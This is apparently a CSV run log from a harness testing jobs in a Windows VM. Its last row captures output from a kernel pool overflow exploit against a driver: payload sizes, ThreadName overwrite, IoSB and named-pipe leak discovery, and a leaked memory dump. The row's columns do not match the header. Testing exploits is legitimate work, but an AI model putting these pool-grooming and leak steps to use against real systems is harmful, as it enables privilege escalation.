timestamp,boot_index,run_index,runs_this_boot,vm_state_before,vm_state_after,remote_ready_before,outcome,exit_code,duration_seconds,stdout_tail,stderr_tail,note
2026-06-09T06:11:19+00:00,1,1,1,running,running,True,success,0,7.172,"HARNESS_EXIT_CODE=0
HARNESS_GUEST_SECONDS=7
","#< CLIXML
<Objs Version=""1.1.0.1"" xmlns=""http://schemas.microsoft.com/powershell/2004/04""><Obj S=""progress"" RefId=""0""><TN RefId=""0""><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><Obj S=""progress"" RefId=""1""><TNRef RefId=""0"" /><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>",
2026-06-09T06:11:36+00:00,1,2,2,running,running,True,success,0,16.0,"HARNESS_EXIT_CODE=0
HARNESS_GUEST_SECONDS=17
","#< CLIXML
<Objs Version=""1.1.0.1"" xmlns=""http://schemas.microsoft.com/powershell/2004/04""><Obj S=""progress"" RefId=""0""><TN RefId=""0""><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><Obj S=""progress"" RefId=""1""><TNRef RefId=""0"" /><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>",
2026-06-09T06:18:54+00:00,1,1,1,running,running,True,success,0,22.078,True,True,1,1.0,1,1,1,1,"gering overflow with payload size: 0xbc (Padding: 0x98, Overflow: 0x24)
 [*] Sending 0xbc bytes of payload to driver...
       Retrying Pool Layout
 [*] Priming overflow with chunk size: 0x100
 [*] Triggering overflow with payload size: 0xbc (Padding: 0x98, Overflow: 0x24)
 [*] Sending 0xbc bytes of payload to driver...
       Retrying Pool Layout
 [*] Priming overflow with chunk size: 0x100
 [*] Triggering overflow with payload size: 0xbc (Padding: 0x98, Overflow: 0x24)
 [*] Sending 0xbc bytes of payload to driver...
 [*] ###### Found ThreadName Overwrite ######
 [*] Cleaned 2999 extra thread names, 0 failed
 [*] IoSB attempt 1 for capture 1
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Confirmed 2 IoSB candidates before pipe allocation on capture 0 IoSB attempt 0 leak 0
 [*] Pipe allocation attempt 1/16 after confirmed IoSB
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Same leak has 2 IoSB and 9 NpFr candidates on pipe leak 0
 [*] Found layout in same leak: IoSB=204 NpFr=304 pipeBase=300 pipeIndex=13 capture=0 iosbAttempt=0 pipeAttempt=0 pipeLeak=0
    [0000026E888A6A00]  42536F490A100000  13007A51B150E6F7
    [0000026E888A6A10]  ECFFFADCE340C607  0000000000000000
    [0000026E888A6A20]  0000000000000000  0000000000000000
    [0000026E888A6A30]  42536F490E0D0003  0000000000000000
    [0000026E888A6A40]  000000000000000C  FFFF930E340C0FC0
    [0000026E888A6A50]  00000000000003E8  6161616161616161
    [0000026E888A6A60]  6161616161616161  6161616161616161
    [0000026E888A6A70]  6161616161616161  6161616161616161
    [0000026E888A6A80]  6161616161616161  6161616161616161
    [0000026E888A6A90]  6161616161616161  6161616161616161
    [0000026E888A6AA0]  6161616161616161  6161616161616161
    [0000026E888A6AB0]  6161616161616161  6161616161616161
    [0000026E888A6AC0]  6161616161616161  6161616161616161
    [0000026E888A6AD0]  6161616161616161  6161616161616161
    [0000026E888A6AE0]  6161616161616161  6161616161616161
    [0000026E888A6AF0]  0000000000000000  0000000000000000
